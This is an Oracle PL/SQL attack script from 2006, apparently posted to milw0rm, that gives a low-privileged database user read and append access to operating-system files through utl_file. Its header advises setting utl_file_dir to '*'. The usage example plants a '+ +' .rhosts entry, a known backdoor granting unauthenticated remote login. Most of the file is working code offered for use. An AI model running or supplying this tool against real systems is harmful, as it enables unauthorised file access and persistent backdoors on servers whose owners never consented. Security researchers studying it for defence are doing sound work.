--
-- $Id: raptor_orafile.sql,v 1.1 2006/12/19 14:21:00 raptor Exp $
--
-- raptor_orafile.sql - file system access suite for oracle
-- Copyright (c) 2006 Marco Ivaldi <raptor@0xdeadbeef.info>
--
-- This is an example file system access suite for Oracle based on the utl_file
-- package (http://www.adp-gmbh.ch/ora/plsql/utl_file.html). Use it to remotely
-- read/write OS files with the privileges of the RDBMS user, without the need
-- for any special privileges (CONNECT and RESOURCE roles are more than enough).
--
-- The database _must_ be configured with a non-NULL utl_file_dir value
-- (preferably '*'). Check it using the following query:
-- SQL> select name, value from v$parameter where name = 'utl_file_dir';
--
-- If you have the required privileges (ALTER SYSTEM) and feel brave 
-- enough to perform a DBMS shutdown/startup, you can consider modifying 
-- this parameter yourself, using the following PL/SQL:
-- SQL> alter system set utl_file_dir='*' scope =spfile;
--
-- See also: http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql
--
-- Usage example:
-- $ sqlplus scott/tiger
-- [...]
-- SQL> @raptor_orafile.sql
-- [...]
-- SQL> exec utlwritefile('/tmp', 'mytest', '# this is a fake .rhosts file');
-- SQL> exec utlwritefile('/tmp', 'mytest', '+ +');
-- SQL> set serveroutput on;
-- SQL> exec utlreadfile('/tmp', 'mytest');
-- # this is a fake .rhosts file
-- + +
-- End of file.
--

-- file reading module
--
-- usage: set serveroutput on;
--        exec utlreadfile('/dir', 'file');
create or replace procedure utlreadfile(p_directory in varchar2, p_filename in varchar2) as
buffer varchar2(260);
fd utl_file.file_type;
begin
	fd := utl_file.fopen(p_directory, p_filename, 'r');
	dbms_output.enable(1000000);
	loop
		utl_file.get_line(fd, buffer, 254);
		dbms_output.put_line(buffer);
	end loop;
	exception when no_data_found then
		dbms_output.put_line('End of file.');
		if (utl_file.is_open(fd) = true) then
			utl_file.fclose(fd);
		end if;
	when others then
		if (utl_file.is_open(fd) = true) then
			utl_file.fclose(fd);
		end if;
end;
/

-- file writing module
--
-- usage: exec utlwritefile('/dir', 'file', 'line to append');
create or replace procedure utlwritefile(p_directory in varchar2, p_filename in varchar2, p_line in varchar2) as
fd utl_file.file_type;
begin
	fd := utl_file.fopen(p_directory, p_filename, 'a'); -- append
	utl_file.put_line(fd, p_line);
	if (utl_file.is_open(fd) = true) then
		utl_file.fclose(fd);
	end if;
end;
/

-- milw0rm.com [2006-12-19]
